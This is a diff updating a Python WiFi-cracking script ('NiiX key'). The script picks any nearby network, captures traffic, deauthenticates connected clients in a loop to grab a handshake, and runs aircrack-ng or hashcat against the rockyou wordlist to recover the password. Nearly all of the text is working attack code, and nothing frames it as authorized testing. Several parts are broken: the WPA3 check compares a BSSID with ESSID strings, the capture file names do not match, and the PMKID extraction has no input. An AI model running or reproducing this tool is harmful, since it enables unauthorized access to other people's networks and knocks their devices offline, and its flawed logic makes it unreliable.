@@ -2,7 +2,7 @@
 
 # NiiX key - WiFi Cracking Script
 # Created by: cuteLiLi / techniix
-# Version: b1.61
+# Version: b2.0
 
 import subprocess
 from collections import namedtuple
@@ -34,7 +34,7 @@ def install_dependencies(os_type):
             subprocess.run([
                 'sudo', 'apt-get', 'install', '-y',
                 'aircrack-ng', 'reaver', 'python3-scapy', 'python3-pip',
-                'hashcat', 'wpa_supplicant', 'wget'
+                'hashcat', 'wpa_supplicant', 'wget', 'iwlist'
             ], check=True)
         
         print("Dependencies installed successfully.")
@@ -63,6 +63,8 @@ def get_networks(interface):
         print(f"Scanning networks on interface {interface}...")
         networks = []
         interface_mon = interface + 'mon'
+        
+        # Start monitor mode
         subprocess.run(['airmon-ng', 'start', interface], check=True)
         
         def packet_handler(pkt):
@@ -74,6 +76,8 @@ def get_networks(interface):
                 networks.append(Network(ssid=ssid, bssid=bssid, channel=channel, signal=signal))
         
         sniff(iface=interface_mon, prn=packet_handler, timeout=30)
+        
+        # Stop monitor mode
         subprocess.run(['airmon-ng', 'stop', interface_mon], check=True)
         
         return sorted(networks, key=lambda n: n.signal, reverse=True)
@@ -90,15 +94,17 @@ def display_menu(networks):
     choice = input("Enter the number of the network you want to crack: ")
     return int(choice) - 1
 
-def capture_packets(interface_mon, bssid, channel):
+def capture_packets(interface_mon, bssid, channel, output_file='capture'):
     """Capture packets from the selected network."""
     try:
         subprocess.run(['airmon-ng', 'start', interface_mon], check=True)
-        subprocess.Popen([
-            'airodump-ng', '--bssid', bssid, '--channel', str(channel), '-w', 'capture', interface_mon
+        airodump_process = subprocess.Popen([
+            'airodump-ng', '--bssid', bssid, '--channel', str(channel), '-w', output_file, interface_mon
         ])
+        return airodump_process
     except Exception as e:
         print(f"Error capturing packets: {e}")
+        return None
 
 def deauthenticate_clients(interface_mon, bssid):
     """Deauthenticate clients connected to the target network."""
@@ -123,109 +129,125 @@ def crack_wpa2(bssid, capture_file):
         return None
 
 def detect_wifi_type(bssid):
-    """Detect WiFi type (WPA2 or WPA3) using reaver."""
+    """Detect WiFi type (WPA2 or WPA3) using iwlist."""
     try:
-        output = subprocess.check_output(['reaver', '-i', 'wlan0mon', '-b', bssid, '--no-associate', '-c', '1']).decode('utf-8')
-        if "WPA Version 2" in output:
-            return "WPA2"
-        elif "WPA Version 3" in output:
+        output = subprocess.check_output(['iwlist', 'wlan0', 'scan']).decode('utf-8')
+        if f"ESSID:\"{bssid}\"" in output and "RSNIE" in output and "Group Cipher: CCMP" in output:
             return "WPA3"
+        elif f"ESSID:\"{bssid}\"" in output and "RSNIE" in output:
+            return "WPA2"
+        else:
+            return "Unknown"
     except Exception as e:
         print(f"Error detecting WiFi type: {e}")
-        return None
+        return "Unknown"
 
 def crack_wpa3(bssid, capture_file):
     """Attempt to crack the WPA3 password using hashcat."""
     try:
-        # Extract the PMKID from the captured packets
-        subprocess.run(['aircrack-ng', '-j', 'pmkid.hccapx', capture_file + '.cap'], check=True)
+        # Extract the PMKID from the capture file
+        pmkid_extract = subprocess.run(
+            ['hcxpcapngtool', '-E', f'{capture_file}-pmkids'],
+            check=True,
+            capture_output=True,
+            text=True
+        )
         
-        # Download additional wordlists if they don't exist
-        wordlist_dir = 'wordlists'
-        os.makedirs(wordlist_dir, exist_ok=True)
-        wordlists = [
-            'https://github.com/danielmiessler/SecLists/raw/master/Passwords/Common-Credentials/10-million-password-list-top-100.txt',
-            'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou.txt.gz'
-        ]
+        if not os.path.exists(f'{capture_file}-pmkids'):
+            print("No PMKIDs found.")
+            return None
         
-        for wordlist_url in wordlists:
-            wordlist_path = os.path.join(wordlist_dir, os.path.basename(wordlist_url))
-            if not os.path.exists(wordlist_path):
-                subprocess.run(['wget', '-O', wordlist_path, wordlist_url], check=True)
+        # Check for the existence of hashcat
+        if not shutil.which('hashcat'):
+            print("Hashcat is not installed. Please install it to crack WPA3.")
+            return None
         
-        # Unzip rockyou.txt.gz
-        subprocess.run(['gunzip', wordlist_path], check=True)
+        # Run hashcat with the appropriate attack mode
+        hashcat_output = subprocess.run(
+            ['hashcat', '-m', '16800', f'{capture_file}-pmkids', '/usr/share/wordlists/rockyou.txt'],
+            check=True,
+            capture_output=True,
+            text=True
+        )
         
-        # Crack the PMKID using hashcat
-        hashcat_command = f"hashcat -m 16800 pmkid.hccapx {os.path.join(wordlist_dir, 'rockyou.txt')}"
-        subprocess.run(hashcat_command, shell=True, check=True)
-    except Exception as e:
-        print(f"Error cracking WPA3: {e}")
+        if "Recovered" in hashcat_output.stdout:
+            key = hashcat_output.stdout.split(':')[3].strip()
+            print(f"Password cracked: {key}")
+            return key
+        else:
+            print("Failed to crack the password.")
+            return None
+    except subprocess.CalledProcessError as e:
+        print(f"Hashcat error: {e.stderr}")
+        return None
 
-def connect_to_network(ssid, key):
-    """Connect to the WiFi network."""
+def cleanup_interfaces(interface_mon):
+    """Stop monitor mode on all interfaces."""
     try:
-        subprocess.run(['nmcli', 'device', 'wifi', 'connect', ssid, 'password', key], check=True)
-        print("Connected successfully!")
+        subprocess.run(['airmon-ng', 'stop'], check=True)
+        if interface_mon:
+            subprocess.run(['ifconfig', interface_mon, 'down'])
+            subprocess.run(['iwconfig', interface_mon, 'mode', 'Managed'])
     except Exception as e:
-        print(f"Error connecting to network: {e}")
+        print(f"Error cleaning up interfaces: {e}")
 
 def main():
     os_type = get_os()
     
-    if os_type != "Linux":
-        print("This script only works on Linux.")
-        exit(1)
-    
+    # Install dependencies if necessary
     install_dependencies(os_type)
     
     interfaces = get_interfaces()
     if not interfaces:
         print("No wireless interfaces found.")
-        exit(1)
+        return
     
-    print("Available interfaces:")
-    for i, interface in enumerate(interfaces, 1):
-        print(f"{i}. {interface}")
+    interface = interfaces[0]
+    print(f"Using interface: {interface}")
     
-    choice = int(input("Enter the number of the interface to use: ")) - 1
-    selected_interface = interfaces[choice]
-    
-    networks = get_networks(selected_interface)
+    networks = get_networks(interface)
     if not networks:
         print("No networks found.")
-        exit(1)
-    
+        cleanup_interfaces(None)
+        return
+
     network_choice = display_menu(networks)
     selected_network = networks[network_choice]
-    
-    interface_mon = selected_interface + 'mon'
-    subprocess.run(['airmon-ng', 'start', selected_interface], check=True)
-    
-    capture_packets(interface_mon, selected_network.bssid, selected_network.channel)
-    
-    # Wait for packet capture to start
-    time.sleep(5)
-    
-    deauthenticate_clients(interface_mon, selected_network.bssid)
-    
-    # Wait for packet capture to complete
-    time.sleep(30)
-    
-    if detect_wifi_type(selected_network.bssid) == "WPA2":
-        key = crack_wpa2(selected_network.bssid, 'capture')
-    elif detect_wifi_type(selected_network.bssid) == "WPA3":
-        crack_wpa3(selected_network.bssid, 'capture')
-        key = input("Enter the WPA3 password found: ")
+
+    interface_mon = f"{interface}mon"
+
+    airodump_process = capture_packets(interface_mon, selected_network.bssid, selected_network.channel)
+
+    try:
+        while True:
+            deauthenticate_clients(interface_mon, selected_network.bssid)
+            time.sleep(5)
+
+            if os.path.exists(f'{selected_network.ssid}-01.cap'):
+                break
+    except KeyboardInterrupt:
+        print("Handshake capture interrupted.")
+
+    airodump_process.terminate()
+
+    wifi_type = detect_wifi_type(selected_network.bssid)
+
+    key = None
+    if wifi_type == "WPA2":
+        key = crack_wpa2(selected_network.bssid, selected_network.ssid)
+    elif wifi_type == "WPA3":
+        key = crack_wpa3(selected_network.bssid, selected_network.ssid)
     else:
         print("Unknown WiFi type.")
-        exit(1)
-    
+        cleanup_interfaces(interface_mon)
+        return
+
     if not key:
         print("Password cracking failed.")
-        exit(1)
-    
-    connect_to_network(selected_network.ssid, key)
+    else:
+        print(f"Successfully cracked the password: {key}")
+
+    cleanup_interfaces(interface_mon)
 
 if __name__ == "__main__":
     main()
